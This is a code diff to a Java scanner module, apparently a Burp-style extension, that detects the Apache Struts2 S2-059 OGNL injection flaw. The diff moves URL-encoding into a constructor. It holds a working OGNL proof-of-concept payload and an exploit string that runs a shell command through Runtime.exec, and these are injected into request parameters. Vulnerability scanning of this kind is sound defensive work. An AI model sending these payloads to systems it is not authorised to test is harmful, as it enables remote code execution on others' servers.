@@ -8,7 +8,8 @@ import java.net.URLEncoder;
 import java.util.List;
 
 public class S2_059 extends IModule {
-    public String poc =
+    public S2_059() {
+        poc =
             "%{" +
             "(#context=#attr['struts.valueStack'].context)" +
             ".(#container=#context['com.opensymphony.xwork2.ActionContext.container'])" +
@@ -21,7 +22,9 @@ public class S2_059 extends IModule {
             ".(#res.getWriter().print('"+ injectMark[1] +"'))" +
             ".(#res.getWriter().flush())" +
             ".(#res.getWriter().close())}";
-    public String exp =
+        poc = URLEncoder.encode(poc);
+
+        exp =
             "%{" +
             "(#context=#attr['struts.valueStack'].context)" +
             ".(#container=#context['com.opensymphony.xwork2.ActionContext.container'])" +
@@ -32,16 +35,18 @@ public class S2_059 extends IModule {
             ".(@java.lang.Runtime@getRuntime()" +
             ".exec('touch /tmp/success'))" +
             "}";
+        exp = URLEncoder.encode(exp);
+    }
 
     @Override
     public IScanIssue start() {
         List<IParameter> parameters = requestInfo.getParameters();
         for (IParameter parameter: parameters) {
             if (parameter.getType() == (byte) 0 || parameter.getType() == (byte) 1) {
-                IParameter newParameter = helpers.buildParameter(parameter.getName(), URLEncoder.encode(poc), parameter.getType());
+                IParameter newParameter = helpers.buildParameter(parameter.getName(), poc, parameter.getType());
                 request = helpers.updateParameter(iHttpRequestResponse.getRequest(), newParameter);
                 if (check()) {
-                    this.detail = URLEncoder.encode(exp);
+                    this.detail = exp;
                     return creatCustomScanIssue();
                 }
             }
